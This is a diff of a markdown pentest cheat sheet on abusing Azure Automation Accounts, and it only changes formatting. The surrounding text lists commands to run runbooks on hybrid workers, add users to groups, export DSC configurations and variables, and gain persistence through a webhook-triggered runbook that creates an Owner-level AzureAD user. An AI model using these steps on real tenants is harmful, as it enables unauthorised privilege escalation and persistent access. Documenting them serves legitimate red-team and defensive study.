@@ -13,18 +13,19 @@ Get-AzAutomationAccount | Get-AzAutomationRunbook
 ### Create a Runbook
 
 * Check user right for automation
+
     ```powershell
     az extension add --upgrade -n automation
     az automation account list # if it doesn't return anything the user is not a part of an Automation group
     az ad signed-in-user list-owned-objects
     ```
+
 * Add the user to the "Automation" group: `Add-AzureADGroupMember -ObjectId <OBJID> -RefObjectId <REFOBJID> -Verbose`
 * Get the role of a user on the Automation account: `Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>`. NOTE: Contributor or higher privileges accounts can create and execute Runbooks
 * List hybrid workers: `Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>`
 * Create a Powershell Runbook: `Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose`
 * Publish the Runbook: `Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose`
 * Start the Runbook: `Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose`
-
 
 ## Automation Account
 
@@ -45,13 +46,12 @@ Get-AzAutomationAccount | Get-AzAutomationCertificate
 Get-AzAutomationAccount | Get-AzAutomationVariable
 ```
 
-
 ### Persistence via Automation Accounts
 
 * Create a new Automation Account
     * "Create Azure Run As account": Yes
 * Import a new runbook that creates an AzureAD user with Owner permissions for the subscription*
-    * Sample runbook https://github.com/NetSPI/MicroBurst
+    * Sample runbook [NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)
     * Publish the runbook
     * Add a webhook to the runbook
 * Add the AzureAD module to the Automation account
@@ -65,7 +65,6 @@ Get-AzAutomationAccount | Get-AzAutomationVariable
     $body = ConvertTo-Json -InputObject $AccountInfo
     $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
     ```
-
 
 ## Desired State Configuration
 
@@ -81,7 +80,6 @@ Get-AzAutomationAccount | Get-AzAutomationDscConfiguration
 $DSCName = ${dscToExport}
 Get-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {$_.name -march $DSCName} | Export-AzAutomationDscConfiguration -OutputFolder (get-location) -Debug
 ```
-
 
 ## References
 
